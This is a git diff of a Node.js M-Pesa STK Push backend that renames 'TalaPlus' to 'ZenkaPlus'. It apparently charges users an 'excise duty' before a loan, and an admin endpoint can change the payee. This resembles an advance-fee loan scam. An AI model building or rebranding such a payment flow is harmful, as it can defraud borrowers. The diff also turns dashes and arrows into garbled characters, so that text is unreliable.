@@ -1,5 +1,5 @@
-/* ==========================================================================
-   TALA PLUS - BACKEND SERVER
+﻿/* ==========================================================================
+   Zenka Plus - BACKEND SERVER
    Serves static files + M-Pesa Daraja STK Push API integration
    No external npm dependencies - uses Node.js built-in modules only
    ========================================================================== */
@@ -90,7 +90,7 @@ async function loadDynamicConfig() {
     }
   } else {
     try {
-      const configFile = path.join(os.tmpdir(), 'talaplus_config.json');
+      const configFile = path.join(os.tmpdir(), 'ZenkaPlus_config.json');
       if (fs.existsSync(configFile)) {
         const cfg = JSON.parse(fs.readFileSync(configFile, 'utf-8'));
         if (cfg.MPESA_PARTYB) {
@@ -151,7 +151,7 @@ async function connectToMongo() {
 // ==========================================================================
 // 3. PERSISTENT TRANSACTION STATE STORE (via os.tmpdir() for serverless)
 // ==========================================================================
-const TX_FILE = path.join(os.tmpdir(), 'talaplus_tx.json');
+const TX_FILE = path.join(os.tmpdir(), 'ZenkaPlus_tx.json');
 
 async function getTransaction(checkoutRequestId) {
   if (isMongoConnected && db) {
@@ -372,8 +372,8 @@ async function initiateStkPush(token, phoneRaw, amountKsh, callbackUrl) {
     PartyB            : getMpesaPartyB(),
     PhoneNumber       : phone,
     CallBackURL       : callbackUrl,
-    AccountReference  : 'TalaPlusExcise',
-    TransactionDesc   : 'Excise Duty - TalaPlus Loan'
+    AccountReference  : 'ZenkaPlusExcise',
+    TransactionDesc   : 'Excise Duty - ZenkaPlus Loan'
   });
 
   const result = await httpsRequest({
@@ -397,7 +397,7 @@ async function initiateStkPush(token, phoneRaw, amountKsh, callbackUrl) {
 // 6. API ROUTE HANDLERS
 // ==========================================================================
 
-/** POST /api/request-stk — Authenticate + initiate STK Push */
+/** POST /api/request-stk â€” Authenticate + initiate STK Push */
 async function handleRequestStk(req, res) {
   const body = await readBody(req);
   const { phone, amount } = body;
@@ -524,7 +524,7 @@ async function handleRequestStk(req, res) {
   }
 }
 
-/** POST /api/mpesa-callback — Safaricom sends payment result here */
+/** POST /api/mpesa-callback â€” Safaricom sends payment result here */
 async function handleMpesaCallback(req, res) {
   const body = await readBody(req);
 
@@ -647,7 +647,7 @@ async function queryDarajaStkStatus(checkoutRequestId) {
   return null;
 }
 
-/** GET /api/check-payment-status?checkoutRequestId=XXX — Frontend polls this */
+/** GET /api/check-payment-status?checkoutRequestId=XXX â€” Frontend polls this */
 async function handleCheckPaymentStatus(req, res) {
   const parsedUrl = url.parse(req.url, true);
   const checkoutRequestId = parsedUrl.query.checkoutRequestId;
@@ -794,7 +794,7 @@ async function handleCheckPaymentStatus(req, res) {
   });
 }
 
-/** POST /api/mock-callback — Dev-only: simulate Safaricom callback locally */
+/** POST /api/mock-callback â€” Dev-only: simulate Safaricom callback locally */
 async function handleMockCallback(req, res) {
   const body = await readBody(req);
   const { checkoutRequestId, success, status } = body;
@@ -876,7 +876,7 @@ async function handleTrackVisit(req, res) {
     }
   } else {
     try {
-      const visitsFile = path.join(os.tmpdir(), 'talaplus_visits.json');
+      const visitsFile = path.join(os.tmpdir(), 'ZenkaPlus_visits.json');
       let visits = [];
       if (fs.existsSync(visitsFile)) {
         visits = JSON.parse(fs.readFileSync(visitsFile, 'utf-8'));
@@ -925,7 +925,7 @@ async function handleAdminStats(req, res) {
     }
   } else {
     try {
-      const visitsFile = path.join(os.tmpdir(), 'talaplus_visits.json');
+      const visitsFile = path.join(os.tmpdir(), 'ZenkaPlus_visits.json');
       if (fs.existsSync(visitsFile)) {
         const visits = JSON.parse(fs.readFileSync(visitsFile, 'utf-8'));
         totalVisits = visits.length;
@@ -1022,7 +1022,7 @@ async function handleAdminConfig(req, res) {
     }
   } else {
     try {
-      const configFile = path.join(os.tmpdir(), 'talaplus_config.json');
+      const configFile = path.join(os.tmpdir(), 'ZenkaPlus_config.json');
       let currentCfg = {};
       if (fs.existsSync(configFile)) {
         currentCfg = JSON.parse(fs.readFileSync(configFile, 'utf-8'));
@@ -1131,13 +1131,13 @@ const server = http.createServer(requestHandler);
 if (require.main === module) {
   server.listen(PORT, () => {
     console.log(`\n==================================================`);
-    console.log(` TalaPlus server successfully started!`);
+    console.log(` ZenkaPlus server successfully started!`);
     console.log(` Local access: http://localhost:${PORT}`);
     console.log(`\n API Endpoints:`);
-    console.log(`   POST /api/request-stk          → Initiate STK Push`);
-    console.log(`   POST /api/mpesa-callback        → Safaricom payment callback`);
-    console.log(`   GET  /api/check-payment-status  → Poll transaction status`);
-    console.log(`   POST /api/mock-callback         → Dev-only: simulate callback`);
+    console.log(`   POST /api/request-stk          â†’ Initiate STK Push`);
+    console.log(`   POST /api/mpesa-callback        â†’ Safaricom payment callback`);
+    console.log(`   GET  /api/check-payment-status  â†’ Poll transaction status`);
+    console.log(`   POST /api/mock-callback         â†’ Dev-only: simulate callback`);
     console.log(`==================================================\n`);
   });
 }
